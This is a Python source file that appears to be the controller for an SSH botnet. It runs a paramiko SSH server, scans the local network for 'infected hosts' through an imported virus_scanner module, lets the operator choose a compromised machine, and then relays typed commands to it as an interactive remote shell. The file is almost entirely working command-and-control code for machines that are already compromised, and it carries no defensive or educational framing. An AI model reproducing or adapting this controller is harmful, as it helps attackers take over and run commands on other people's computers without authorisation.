import socket
import paramiko
import threading
import sys
import os
import virus_scanner

#script args
server_address = '127.0.0.1'
server_port = int(7688)
server_username = "username"
server_password = "password"
server_host_key = paramiko.RSAKey(filename="/media/th3x0/101E13E1101E13E1/ssh_botnet/id_rsa")
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)



#ssh server parameters defined in the class
class Server(paramiko.ServerInterface):
    def __init__(self):
        self.username = ""
        self.event = threading.Event()
    

    def check_auth_password(self, username, password):
        if username == server_username and password == server_password:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED



#ssh client handler
def client_handler(client_socket):
    try:
        #bind client socket to ssh server session and add rsa key
        ssh_session = paramiko.Transport(client_socket)
        ssh_session.add_server_key(server_host_key)
        server = Server()
#start the ssh server and negotiate ssh params
        try:
            ssh_session.start_server(server=server)
            print("[*] SSH Parameters Negotiation Succeeded")
        except :
            print("[!] SSH Parameters Negotiation Failed")
    
#authenticate the client
        print("[*] Authenticating")
        ssh_channel = ssh_session.accept(20)
        if ssh_channel == None or not ssh_channel.active:
            print("[*] SSH Client Authentication Failure")
            ssh_session.close()
        else:
            print("[*] SSH Client Authenticated")
            username = ""
            try:
                ssh_channel.send("whoami")
                username = ssh_channel.recv(1024).decode('utf-8').replace('\n','')
                print(f"[+] Connected as : {username}")
            except:
                print("[!] Error while retrieving username")
            #ssh channel is established. We can start the shell
            #and send commands from input
            while not ssh_channel.closed:
                try:
                    
                    
                    command = input(f"<{username}:#> ").rstrip()
                    if len(command):
                        if command != "exit":
                            ssh_channel.send(command)
                            print(ssh_channel.recv(1024).decode('utf-8') + '\n')
                        elif command == "whoami":
                            ssh_channel.send(command)
                            username = ssh_channel.recv(1024).decode('utf-8').replace('\n','')
                            print(username + '\n')
                        else:
                            print("[*] Exiting")
                            try:
                                ssh_session.close()
                            except:
                                print("[!] Error closing SSH session")
                            print("[*] SSH session closed")
                except Exception as err:
                    print("[*] Caught Exception: ", str(err))
                    print("[*] Exiting Script")
                    try:
                        ssh_session.close()
                    except:
                        print("[!] Error closing SSH session")
                        print("[*] SSH session closed")
                        sys.exit(1)
    except:
        pass




#scan network and display infected hosts to pick up the one u want
def scan_and_choose():
    vs = virus_scanner.virus_scanner(port=7688)  
    hosts = vs.get_ihosts()

    selected = False

    if len(hosts)-1 == 0:
        print("[!] Network scan failed, enabling manual mode...")
        while not selected:
            try:
                i = input("Select host IP : ")
                try:
                    print(f"[+] Processing connection to {i} ({socket.gethostbyaddr(i)[0]})")
                except:
                    print(f"[+] Processing connection to {i}")
                selected = True
                return i
            except:
                pass

    for i in range(len(hosts)-1):
        try:
            print(f"[{i}] {hosts[i]} ({socket.gethostbyaddr(hosts[i])[0]})")
        except:
            print(f"[{i}] {hosts[i]}")



    
    while not selected:
        try:
            i = int(input("Select host index : "))
            if i <= len(hosts):
                try:
                    print(f"[+] Processing connection to {hosts[i]} ({socket.gethostbyaddr(hosts[i])[0]})")
                except:
                    print(f"[+] Processing connection to {hosts[i]}")
                selected = True
                return i
            else:
                print("[!] Index out of range")
        except:
            pass


def start_server_and_listen_to_host(host):

    #ssh server bind and listen
    try:
        server_socket.bind((server_address, server_port))
    except:
        print(f"[!] Bind Error for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
        sys.exit(1)

    print(f"[*] Bind Success for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
    server_socket.listen(100)
    print("[*] Listening")
    #Keep ssh server active and accept incoming tcp connections
    while True:
        client_socket, addr = server_socket.accept()
        print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}")
        if addr[0] in host:
            print(f"[*] Accepting TCP Connection from {addr[0]}:{addr[1]}")
            client_handler(client_socket)





#scan network and display infected hosts to pick up the one u want

host = scan_and_choose()

#start server
start_server_and_listen_to_host(host)
